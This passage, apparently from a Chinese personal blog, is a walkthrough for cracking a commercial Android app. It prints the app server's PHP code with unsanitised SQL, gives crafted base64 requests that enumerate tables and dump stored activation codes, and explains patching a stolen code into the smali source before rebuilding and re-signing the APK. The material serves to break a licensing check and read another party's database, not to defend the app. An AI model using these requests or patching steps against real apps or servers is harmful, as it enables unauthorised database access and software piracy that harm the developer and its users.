&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>].<span class="string">&quot; WHERE &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">8</span>].<span class="string">&quot; LIMIT &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">9</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$sql</span>=<span class="variable">$mysql_s</span>-&gt;query(<span class="string">&quot;SELECT &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>].<span class="string">&quot; FROM &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>].<span class="string">&quot; LIMIT &quot;</span>.<span class="variable">$mainbody</span>[<span class="number">9</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$sql</span>))</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">               <span class="variable">$txt</span> .= <span class="variable">$a</span>.<span class="string">&#x27;|.+.|&#x27;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="variable">$txt</span> .= <span class="string">&#x27;|.*.|&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QLData&quot;</span>.<span class="variable">$txt</span>;            </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$mainbody</span>[<span class="number">5</span>]==<span class="string">&quot;DataTest&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;DataTest&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mysql_s</span>-&gt;destruct();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt; </span><br><span class="line">            window.location.href=<span class="string">&#x27;http://www.baidu.com&#x27;</span>;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 通过源码分析，发现以下关键几点：<br />
1. 接受请求后，获取<code>captcha</code>字段，进行base64解码，获取连接的主机名，查询字段、条件等；<br />
2. 没有做SQL防注入，如：<code>$sql=$mysql_s-&gt;query("SELECT ".$mainbody[7]." FROM ".$mainbody[6]);</code><br />
所以，只要通过抓包工具，获取请求地址和参数，使用base64解码后，再重新发送请求，即可查询到想要的信息。</p>
<h2 id="抓包">抓包</h2>
<ol type="1">
<li><p>Fiddler设置手机抓取Https请求<br />
Tools-Options-HTTPS <img data-src="https://img.hujinbo.me/blog/4GpqmI.png" /></p></li>
<li><p>设置允许远程计算机连接和暴露端口<br />
Tools-Options-Connections <img data-src="https://img.hujinbo.me/blog/QW8jib.png" /></p></li>
<li><p>关闭电脑的防火墙（若使用虚拟机还需将网络调整为桥接模式）<br />
<img data-src="https://img.hujinbo.me/blog/QLpzmG.png" /> <img data-src="https://img.hujinbo.me/blog/bIkOlE.png" /></p></li>
<li><p>设置手机代理，确保和电脑处于同个内网<br />
<img data-src="https://img.hujinbo.me/blog/PDBhx1.jpg" /></p></li>
<li><p>打开APP监听请求<br />
<img data-src="https://img.hujinbo.me/blog/Ypgysb.png" /></p></li>
</ol>
<h2 id="修改源码">修改源码</h2>
<p>上述通过抓包分析，得到请求体，使用<span class="exturl" data-url="aHR0cHM6Ly90b29sLm9zY2hpbmEubmV0L2VuY3J5cHQ/dHlwZT0z">base64解码<i class="fa fa-external-link-alt"></i></span>后，得到如下字符串： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSDATAlocalhost:3306|*||*||*|qwe|*|utf8|*|QrData|*|yhb|*|yhb|*|yhb=&#x27;6666666666666666&#x27;</span><br></pre></td></tr></table></figure> 为方便分析，我们将<code>openapi_unsafe.php</code>部分代码提取，并<span class="exturl" data-url="aHR0cHM6Ly9jLnJ1bm9vYi5jb20vY29tcGlsZS8x">在线运行<i class="fa fa-external-link-alt"></i></span>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$receive</span> = base64_decode(<span class="string">&quot;TVNEQVRBbG9jYWxob3N0OjMzMDZ8Knx8Knx8Knxxd2V8Knx1dGY4fCp8UXJEYXRhfCp8eWhifCp8eWhifCp8eWhiPSc2NjY2NjY2NjY2NjY2NjY2Jw==&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$receive</span>;</span><br><span class="line"><span class="variable">$mainbody</span> = substr(<span class="variable">$receive</span>,<span class="number">6</span>);</span><br><span class="line"><span class="variable">$mainbody</span> = explode(<span class="string">&quot;|*|&quot;</span>,<span class="variable">$mainbody</span>);</span><br><span class="line"><span class="keyword">if</span>(count(<span class="variable">$mainbody</span>)&lt;<span class="number">6</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;0Hostname=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">0</span>].<span class="string">&quot;, &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1User=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">1</span>].<span class="string">&quot;, &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2Password=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">2</span>].<span class="string">&quot;, &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;3Database=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">3</span>].<span class="string">&quot;, &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;4Code=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">4</span>].<span class="string">&quot;, &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5Comm=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;6Comm=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;7Comm=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;8Comm=&quot;</span>.<span class="variable">$mainbody</span>[<span class="number">8</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<ol type="1">
<li><p>按照常见sql注入的方式，我们先获取所有的表，将如下请求base64编码后，使用postman发送： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSDATAlocalhost:3306|*||*||*|qwe|*|utf8|*|STables</span><br></pre></td></tr></table></figure></p></li>
<li><p>拿到所有的表后，我们再依次获取表结构、数据等信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取表结构</span><br><span class="line">MSDATAlocalhost:3306|*||*||*|qwe|*|utf8|*|QrData|*|information_schema.columns|*|column_name|*|table_schema=&#x27;qwe&#x27; and table_name=&#x27;yhb&#x27;</span><br><span class="line"># 获取所有字段的数据</span><br><span class="line">MSDATAlocalhost:3306|*||*||*|qwe|*|utf8|*|QrData|*|yhb|*|yhb,jhsj,day|*|</span><br></pre></td></tr></table></figure> <img data-src="https://img.hujinbo.me/blog/a36EEn.png" /></p></li>
<li><p>根据源码分析后，发现启动APP时会读取存储的激活码，如果激活码不存在，默认为<code>6666666666666666</code>，所以只要把<code>smali</code>文件中的<code>6666666666666666</code>替换为我们刚刚查询到的任意1个激活码即可。 <img data-src="https://img.hujinbo.me/blog/SGrAiC.png" /></p></li>
</ol>
<h2 id="打包">打包</h2>
<p>上述已经完成源码修改，接下来进行打包，执行以下命令后，会生成一个dist目录，里面包含打包完的apk文件，但此文件还未签名，无法安装。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apktool b demo</span><br></pre></td></tr></table></figure></p>
<h2 id="签名">签名</h2>
<ol type="1">
<li><p>生成keystore文件，执行以下命令会生成<code>demo.keystore</code>证书文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">keytool -genkey -alias demo.keystore -keyalg RSA -validity 20000 -keystore demo.keystore</span><br></pre></td></tr></table></figure> <img data-src="https://img.hujinbo.me/blog/sU1i3A.png" /></p></li>
<li><p>执行以下命令，对重新打包后的apk文件进行签名 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jarsigner -verbose -keystore demo.keystore -signedjar demo_signed.apk demo.apk demo.keystore</span><br></pre></td></tr></table></figure> <img data-src="https://img.hujinbo.me/blog/Om6YOv.png" /></p></li>
</ol>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
</search>
